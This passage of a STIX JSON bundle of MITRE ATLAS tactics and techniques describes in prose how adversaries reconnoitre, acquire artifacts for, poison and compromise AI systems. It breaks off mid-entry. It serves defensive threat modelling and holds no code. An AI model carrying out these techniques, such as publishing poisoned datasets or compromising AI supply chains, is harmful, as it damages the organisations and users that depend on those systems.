{"type": "bundle", "id": "bundle--4abc8300-e60e-4fbc-8391-46e90aa4b16b", "objects": [{"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--e419ce6f-0733-48b6-a428-a14beddddb96", "created": "2025-08-12T19:58:34.757383Z", "modified": "2025-08-12T19:58:34.757383Z", "name": "Reconnaissance", "description": "The adversary is trying to gather information about the AI system they can use to plan future operations.\n\nReconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.\nSuch information may include details of the victim organizations' AI capabilities and research efforts.\nThis information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to obtain relevant AI artifacts, targeting AI capabilities used by the victim, tailoring attacks to the particular models used by the victim, or to drive and lead further Reconnaissance efforts.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0002", "external_id": "AML.TA0002"}], "x_mitre_shortname": "reconnaissance"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--07ea9f43-aeca-420d-be12-57b6572e313c", "created": "2025-08-12T19:58:34.757467Z", "modified": "2025-08-12T19:58:34.757467Z", "name": "Resource Development", "description": "The adversary is trying to establish resources they can use to support operations.\n\nResource Development consists of techniques that involve adversaries creating,\npurchasing, or compromising/stealing resources that can be used to support targeting.\nSuch resources include AI artifacts, infrastructure, accounts, or capabilities.\nThese resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as [AI Attack Staging](/tactics/AML.TA0001).", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0003", "external_id": "AML.TA0003"}], "x_mitre_shortname": "resource-development"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--725b8ce5-4072-4e38-955e-3a1569a97500", "created": "2025-08-12T19:58:34.757542Z", "modified": "2025-08-12T19:58:34.757542Z", "name": "Initial Access", "description": "The adversary is trying to gain access to the AI system.\n\nThe target system could be a network, mobile device, or an edge device such as a sensor platform.\nThe AI capabilities used by the system could be local with onboard or cloud-enabled AI capabilities.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within the system.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0004", "external_id": "AML.TA0004"}], "x_mitre_shortname": "initial-access"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--f565a9be-46e3-4cd3-8dd7-b08ed5ad2a83", "created": "2025-08-12T19:58:34.757616Z", "modified": "2025-08-12T19:58:34.757616Z", "name": "AI Model Access", "description": "The adversary is attempting to gain some level of access to an AI model.\n\nAI Model Access enables techniques that use various types of access to the AI model that can be used by the adversary to gain information, develop attacks, and as a means to input data to the model.\nThe level of access can range from the full knowledge of the internals of the model to access to the physical environment where data is collected for use in the AI model.\nThe adversary may use varying levels of model access during the course of their attack, from staging the attack to impacting the target system.\n\nAccess to an AI model may require access to the system housing the model, the model may be publically accessible via an API, or it may be accessed indirectly via interaction with a product or service that utilizes AI as part of its processes.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0000", "external_id": "AML.TA0000"}], "x_mitre_shortname": "ai-model-access"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--70d6b227-779b-4cb4-801d-afd357d3b856", "created": "2025-08-12T19:58:34.757689Z", "modified": "2025-08-12T19:58:34.757689Z", "name": "Execution", "description": "The adversary is trying to run malicious code embedded in AI artifacts or software.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system.\nTechniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data.\nFor example, an adversary might use a remote access tool to run a PowerShell script that does [Remote System Discovery](https://attack.mitre.org/techniques/T1018/).", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0005", "external_id": "AML.TA0005"}], "x_mitre_shortname": "execution"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--c4bb706b-c830-49ad-baf1-79fbba5dcdf5", "created": "2025-08-12T19:58:34.757765Z", "modified": "2025-08-12T19:58:34.757765Z", "name": "Persistence", "description": "The adversary is trying to maintain their foothold via AI artifacts or software.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.\nTechniques used for persistence often involve leaving behind modified ML artifacts such as poisoned training data or manipulated AI models.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0006", "external_id": "AML.TA0006"}], "x_mitre_shortname": "persistence"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--5f0321c8-001d-473b-aa9e-c30cbc510d4f", "created": "2025-08-12T19:58:34.757839Z", "modified": "2025-08-12T19:58:34.757839Z", "name": "Privilege Escalation", "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include:\n- SYSTEM/root level\n- local administrator\n- user account with admin-like access\n- user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0012", "external_id": "AML.TA0012"}], "x_mitre_shortname": "privilege-escalation"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--f815361d-780b-4f9b-ad09-ef4e29ec4a13", "created": "2025-08-12T19:58:34.757912Z", "modified": "2025-08-12T19:58:34.757912Z", "name": "Defense Evasion", "description": "The adversary is trying to avoid being detected by AI-enabled security software.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.\nTechniques used for defense evasion include evading AI-enabled security software such as malware detectors.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0007", "external_id": "AML.TA0007"}], "x_mitre_shortname": "defense-evasion"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--901e36e1-f221-4123-bce4-d7dd7cad017f", "created": "2025-08-12T19:58:34.757983Z", "modified": "2025-08-12T19:58:34.757983Z", "name": "Credential Access", "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0013", "external_id": "AML.TA0013"}], "x_mitre_shortname": "credential-access"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--36c2822a-d608-4e9d-98c9-56052e10999d", "created": "2025-08-12T19:58:34.758056Z", "modified": "2025-08-12T19:58:34.758056Z", "name": "Discovery", "description": "The adversary is trying to figure out your AI environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network.\nThese techniques help adversaries observe the environment and orient themselves before deciding how to act.\nThey also allow adversaries to explore what they can control and what's around their entry point in order to discover how it could benefit their current objective.\nNative operating system tools are often used toward this post-compromise information-gathering objective.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0008", "external_id": "AML.TA0008"}], "x_mitre_shortname": "discovery"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--4afb8598-f27f-45e8-bcbf-c34041c66c9a", "created": "2025-08-12T19:58:34.758128Z", "modified": "2025-08-12T19:58:34.758128Z", "name": "Collection", "description": "The adversary is trying to gather AI artifacts and other related information relevant to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives.\nFrequently, the next goal after collecting data is to steal (exfiltrate) the AI artifacts, or use the collected information to stage future operations.\nCommon target sources include software repositories, container registries, model repositories, and object stores.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0009", "external_id": "AML.TA0009"}], "x_mitre_shortname": "collection"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--7b4f91df-6744-4773-a2f8-65315293e7a6", "created": "2025-08-12T19:58:34.758199Z", "modified": "2025-08-12T19:58:34.758199Z", "name": "AI Attack Staging", "description": "The adversary is leveraging their knowledge of and access to the target system to tailor the attack.\n\nAI Attack Staging consists of techniques adversaries use to prepare their attack on the target AI model.\nTechniques can include training proxy models, poisoning the target model, and crafting adversarial data to feed the target model.\nSome of these techniques can be performed in an offline manner and are thus difficult to mitigate.\nThese techniques are often used to achieve the adversary's end goal.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0001", "external_id": "AML.TA0001"}], "x_mitre_shortname": "ai-attack-staging"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--74bc7496-5ffe-4b6f-a26e-dfaaa5760c32", "created": "2025-08-12T19:58:34.758271Z", "modified": "2025-08-12T19:58:34.758271Z", "name": "Command and Control", "description": "The adversary is trying to communicate with compromised AI systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim's network structure and defenses.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0014", "external_id": "AML.TA0014"}], "x_mitre_shortname": "command-and-control"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--f4439668-ae25-480b-9bba-9a54e9c23ed7", "created": "2025-08-12T19:58:34.758343Z", "modified": "2025-08-12T19:58:34.758343Z", "name": "Exfiltration", "description": "The adversary is trying to steal AI artifacts or other information about the AI system.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network.\nData may be stolen for its valuable intellectual property, or for use in staging future operations.\n\nTechniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0010", "external_id": "AML.TA0010"}], "x_mitre_shortname": "exfiltration"}, {"type": "x-mitre-tactic", "spec_version": "2.1", "id": "x-mitre-tactic--f45800a5-6206-4862-b3ae-0a9f02dc6b13", "created": "2025-08-12T19:58:34.758414Z", "modified": "2025-08-12T19:58:34.758414Z", "name": "Impact", "description": "The adversary is trying to manipulate, interrupt, erode confidence in, or destroy your AI systems and data.\n\nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes.\nTechniques used for impact can include destroying or tampering with data.\nIn some cases, business processes can look fine, but may have been altered to benefit the adversaries' goals.\nThese techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/tactics/AML.TA0011", "external_id": "AML.TA0011"}], "x_mitre_shortname": "impact"}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--3ac1b7da-0993-4e3f-a90f-710f0e901906", "created": "2025-08-12T19:58:34.744144Z", "modified": "2025-08-12T19:58:34.744144Z", "name": "Search Open Technical Databases", "description": "Adversaries may search for publicly available research and technical documentation to learn how and where AI is used within a victim organization.\nThe adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective.\nOrganizations often use open source model architectures trained on additional proprietary data in production.\nKnowledge of this underlying architecture allows the adversary to craft more realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)).\nAn adversary can search these resources for publications for authors employed at the victim organization.\n\nResearch and technical materials may exist as academic papers published in [Journals and Conference Proceedings](/techniques/AML.T0000.000), or stored in [Pre-Print Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0000", "external_id": "AML.T0000"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--eb9695c5-380a-43cc-b758-7004449f058d", "created": "2025-08-12T19:58:34.744358Z", "modified": "2025-08-12T19:58:34.744358Z", "name": "Journals and Conference Proceedings", "description": "Many of the publications accepted at premier artificial intelligence conferences and journals come from commercial labs.\nSome journals and conferences are open access, others may require paying for access or a membership.\nThese publications will often describe in detail all aspects of a particular approach for reproducibility.\nThis information can be used by adversaries to implement the paper.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0000.000", "external_id": "AML.T0000.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--1bccd478-edf1-4a20-bb05-8842e8ce48f5", "created": "2025-08-12T19:58:34.744696Z", "modified": "2025-08-12T19:58:34.744696Z", "name": "Pre-Print Repositories", "description": "Pre-Print repositories, such as arXiv, contain the latest academic research papers that haven't been peer reviewed.\nThey may contain research notes, or technical reports that aren't typically published in journals or conference proceedings.\nPre-print repositories also serve as a central location to share papers that have been accepted to journals.\nSearching pre-print repositories  provide adversaries with a relatively up-to-date view of what researchers in the victim organization are working on.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0000.001", "external_id": "AML.T0000.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--d1e9dbb1-e5f8-4c40-86ca-f328b06a023f", "created": "2025-08-12T19:58:34.744858Z", "modified": "2025-08-12T19:58:34.744858Z", "name": "Technical Blogs", "description": "Research labs at academic institutions and Company R&D divisions often have blogs that highlight their use of artificial intelligence and its application to the organizations unique problems.\nIndividual researchers also frequently document their work in blogposts.\nAn adversary may search for posts made by the target victim organization or its employees.\nIn comparison to [Journals and Conference Proceedings](/techniques/AML.T0000.000) and [Pre-Print Repositories](/techniques/AML.T0000.001) this material will often contain more practical aspects of the AI system.\nThis could include underlying technologies and frameworks used, and possibly some information about the API access and use case.\nThis will help the adversary better understand how that organization is using AI internally and the details of their approach that could aid in tailoring an attack.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0000.002", "external_id": "AML.T0000.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--c97e17f6-1d83-4c78-b5a2-4c348279b300", "created": "2025-08-12T19:58:34.745028Z", "modified": "2025-08-12T19:58:34.745028Z", "name": "Search Open AI Vulnerability Analysis", "description": "Much like the [Search Open Technical Databases](/techniques/AML.T0000), there is often ample research available on the vulnerabilities of common AI models. Once a target has been identified, an adversary will likely try to identify any pre-existing work that has been done for this class of models.\nThis will include not only reading academic papers that may identify the particulars of a successful attack, but also identifying pre-existing implementations of those attacks. The adversary may obtain [Adversarial AI Attack Implementations](/techniques/AML.T0016.000) or develop their own [Adversarial AI Attacks](/techniques/AML.T0017.000) if necessary.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0001", "external_id": "AML.T0001"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--be091749-3b46-463f-9df2-3eddc05ca8c0", "created": "2025-08-12T19:58:34.745125Z", "modified": "2025-08-12T19:58:34.745125Z", "name": "Search Victim-Owned Websites", "description": "Adversaries may search websites owned by the victim for information that can be used during targeting.\nVictim-owned websites may contain technical details about their AI-enabled products or services.\nVictim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info.\nThese sites may also have details highlighting business operations and relationships.\n\nAdversaries may search victim-owned websites to gather actionable information.\nThis information may help adversaries tailor their attacks (e.g. [Adversarial AI Attacks](/techniques/AML.T0017.000) or [Manual Modification](/techniques/AML.T0043.003)).\nInformation from these sources may reveal opportunities for other forms of reconnaissance (e.g. [Search Open Technical Databases](/techniques/AML.T0000) or [Search Open AI Vulnerability Analysis](/techniques/AML.T0001))", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0003", "external_id": "AML.T0003"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--4ba93236-1f61-4405-b7f4-a8b6be4c0d97", "created": "2025-08-12T19:58:34.745217Z", "modified": "2025-08-12T19:58:34.745217Z", "name": "Search Application Repositories", "description": "Adversaries may search open application repositories during targeting.\nExamples of these include Google Play, the iOS App store, the macOS App Store, and the Microsoft Store.\n\nAdversaries may craft search queries seeking applications that contain a AI-enabled components.\nFrequently, the next step is to [Acquire Public AI Artifacts](/techniques/AML.T0002).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0004", "external_id": "AML.T0004"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--1ca5e771-823c-4f3f-b203-0c10d18b3509", "created": "2025-08-12T19:58:34.745312Z", "modified": "2025-08-12T19:58:34.745312Z", "name": "Active Scanning", "description": "An adversary may probe or scan the victim system to gather information for targeting.\nThis is distinct from other reconnaissance techniques that do not involve direct interaction with the victim system.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "reconnaissance"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0006", "external_id": "AML.T0006"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--762c1ab1-4885-4ac6-b167-f72135a54444", "created": "2025-08-12T19:58:34.745402Z", "modified": "2025-08-12T19:58:34.745402Z", "name": "Acquire Public AI Artifacts", "description": "Adversaries may search public sources, including cloud storage, public-facing services, and software or data repositories, to identify AI artifacts.\nThese AI artifacts may include the software stack used to train and deploy models, training and testing data, model configurations and parameters.\nAn adversary will be particularly interested in artifacts hosted by or associated with the victim organization as they may represent what that organization uses in a production environment.\nAdversaries may identify artifact repositories via other resources associated with the victim organization (e.g. [Search Victim-Owned Websites](/techniques/AML.T0003) or [Search Open Technical Databases](/techniques/AML.T0000)).\nThese AI artifacts often provide adversaries with details of the AI task and approach.\n\nAI artifacts can aid in an adversary's ability to [Create Proxy AI Model](/techniques/AML.T0005).\nIf these artifacts include pieces of the actual model in production, they can be used to directly [Craft Adversarial Data](/techniques/AML.T0043).\nAcquiring some artifacts requires registration (providing user details such email/name), AWS keys, or written requests, and may require the adversary to [Establish Accounts](/techniques/AML.T0021).\n\nArtifacts might be hosted on victim-controlled infrastructure, providing the victim with some information on who has accessed that data.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0002", "external_id": "AML.T0002"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--b98c5698-984d-49a4-9353-b62cdc27409b", "created": "2025-08-12T19:58:34.745482Z", "modified": "2025-08-12T19:58:34.745482Z", "name": "Datasets", "description": "Adversaries may collect public datasets to use in their operations.\nDatasets used by the victim organization or datasets that are representative of the data used by the victim organization may be valuable to adversaries.\nDatasets can be stored in cloud storage, or on victim-owned websites.\nSome datasets require the adversary to [Establish Accounts](/techniques/AML.T0021) for access.\n\nAcquired datasets help the adversary advance their operations, stage attacks,  and tailor attacks to the victim organization.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0002.000", "external_id": "AML.T0002.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--c2ac1f16-43b3-464b-bf64-f352c6986692", "created": "2025-08-12T19:58:34.745629Z", "modified": "2025-08-12T19:58:34.745629Z", "name": "Models", "description": "Adversaries may acquire public models to use in their operations.\nAdversaries may seek models used by the victim organization or models that are representative of those used by the victim organization.\nRepresentative models may include model architectures, or pre-trained models which define the architecture as well as model parameters from training on a dataset.\nThe adversary may search public sources for common model architecture configuration file formats such as YAML or Python configuration files, and common model storage file formats such as ONNX (.onnx), HDF5 (.h5), Pickle (.pkl), PyTorch (.pth), or TensorFlow (.pb, .tflite).\n\nAcquired models are useful in advancing the adversary's operations and are frequently used to tailor attacks to the victim model.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0002.001", "external_id": "AML.T0002.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--d5288537-b502-445f-b5ce-41c625b39162", "created": "2025-08-12T19:58:34.745787Z", "modified": "2025-08-12T19:58:34.745787Z", "name": "Obtain Capabilities", "description": "Adversaries may search for and obtain software capabilities for use in their operations.\nCapabilities may be specific to AI-based attacks [Adversarial AI Attack Implementations](/techniques/AML.T0016.000) or generic software tools repurposed for malicious intent ([Software Tools](/techniques/AML.T0016.001)). In both instances, an adversary may modify or customize the capability to aid in targeting a particular AI-enabled system.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0016", "external_id": "AML.T0016"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--d2d19d63-0d24-48be-bb96-cce753f05fab", "created": "2025-08-12T19:58:34.745867Z", "modified": "2025-08-12T19:58:34.745867Z", "name": "Adversarial AI Attack Implementations", "description": "Adversaries may search for existing open source implementations of AI attacks. The research community often publishes their code for reproducibility and to further future research. Libraries intended for research purposes, such as CleverHans, the Adversarial Robustness Toolbox, and FoolBox, can be weaponized by an adversary. Adversaries may also obtain and use tools that were not originally designed for adversarial AI attacks as part of their attack.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0016.000", "external_id": "AML.T0016.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--6c7b7972-39ae-4188-89ee-72dee4b9410d", "created": "2025-08-12T19:58:34.746011Z", "modified": "2025-08-12T19:58:34.746011Z", "name": "Software Tools", "description": "Adversaries may search for and obtain software tools to support their operations.\nSoftware designed for legitimate use may be repurposed by an adversary for malicious intent.\nAn adversary may modify or customize software tools to achieve their purpose.\nSoftware tools used to support attacks on AI systems are not necessarily AI-based themselves.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0016.001", "external_id": "AML.T0016.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--816a46e5-b654-4bc5-ab65-36f962ff2a15", "created": "2025-08-12T19:58:34.746169Z", "modified": "2025-08-12T19:58:34.746169Z", "name": "Develop Capabilities", "description": "Adversaries may develop their own capabilities to support operations. This process encompasses identifying requirements, building solutions, and deploying capabilities. Capabilities used to support attacks on AI-enabled systems are not necessarily AI-based themselves. Examples include setting up websites with adversarial information or creating Jupyter notebooks with obfuscated exfiltration code.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0017", "external_id": "AML.T0017"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--3f0f88eb-8f24-4ae0-9049-2f8b892cf149", "created": "2025-08-12T19:58:34.746251Z", "modified": "2025-08-12T19:58:34.746251Z", "name": "Adversarial AI Attacks", "description": "Adversaries may develop their own adversarial attacks.\nThey may leverage existing libraries as a starting point ([Adversarial AI Attack Implementations](/techniques/AML.T0016.000)).\nThey may implement ideas described in public research papers or develop custom made attacks for the victim model.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0017.000", "external_id": "AML.T0017.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--828ce387-26a1-4e8f-8f4e-9018748282c4", "created": "2025-08-12T19:58:34.746406Z", "modified": "2025-08-12T19:58:34.746406Z", "name": "Acquire Infrastructure", "description": "Adversaries may buy, lease, or rent infrastructure for use throughout their operation.\nA wide variety of infrastructure exists for hosting and orchestrating adversary operations.\nInfrastructure solutions include physical or cloud servers, domains, mobile devices, and third-party web services.\nFree resources may also be used, but they are typically limited.\nInfrastructure can also include physical components such as countermeasures that degrade or disrupt AI components or sensors, including printed materials, wearables, or disguises.\n\nUse of these infrastructure solutions allows an adversary to stage, launch, and execute an operation.\nSolutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services.\nDepending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0008", "external_id": "AML.T0008"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--4a9ac079-addd-4dfa-98c3-73606d4e75e3", "created": "2025-08-12T19:58:34.746487Z", "modified": "2025-08-12T19:58:34.746487Z", "name": "AI Development Workspaces", "description": "Developing and staging AI attacks often requires expensive compute resources.\nAdversaries may need access to one or many GPUs in order to develop an attack.\nThey may try to anonymously use free resources such as Google Colaboratory, or cloud resources such as AWS, Azure, or Google Cloud as an efficient way to stand up temporary resources to conduct operations.\nMultiple workspaces may be used to avoid detection.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0008.000", "external_id": "AML.T0008.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--3630cf80-5c1d-4179-99e8-95cb11d16a52", "created": "2025-08-12T19:58:34.746628Z", "modified": "2025-08-12T19:58:34.746628Z", "name": "Consumer Hardware", "description": "Adversaries may acquire consumer hardware to conduct their attacks.\nOwning the hardware provides the adversary with complete control of the environment. These devices can be hard to trace.\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0008.001", "external_id": "AML.T0008.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--0d2e410d-cc24-42c3-a26b-86059cb9d976", "created": "2025-08-12T19:58:34.746779Z", "modified": "2025-08-12T19:58:34.746779Z", "name": "Publish Poisoned Datasets", "description": "Adversaries may [Poison Training Data](/techniques/AML.T0020) and publish it to a public location.\nThe poisoned dataset may be a novel dataset or a poisoned variant of an existing open source dataset.\nThis data may be introduced to a victim system via [AI Supply Chain Compromise](/techniques/AML.T0010).\n", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0019", "external_id": "AML.T0019"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--014b45cd-0f8f-447f-b92e-daeaaa03c6bd", "created": "2025-08-12T19:58:34.746866Z", "modified": "2025-08-12T19:58:34.746866Z", "name": "AI Supply Chain Compromise", "description": "Adversaries may gain initial access to a system by compromising the unique portions of the AI supply chain.\nThis could include [Hardware](/techniques/AML.T0010.000), [Data](/techniques/AML.T0010.002) and its annotations, parts of the AI [AI Software](/techniques/AML.T0010.001) stack, or the [Model](/techniques/AML.T0010.003) itself.\nIn some instances the attacker will need secondary access to fully carry out an attack using compromised components of the supply chain.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0010", "external_id": "AML.T0010"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": 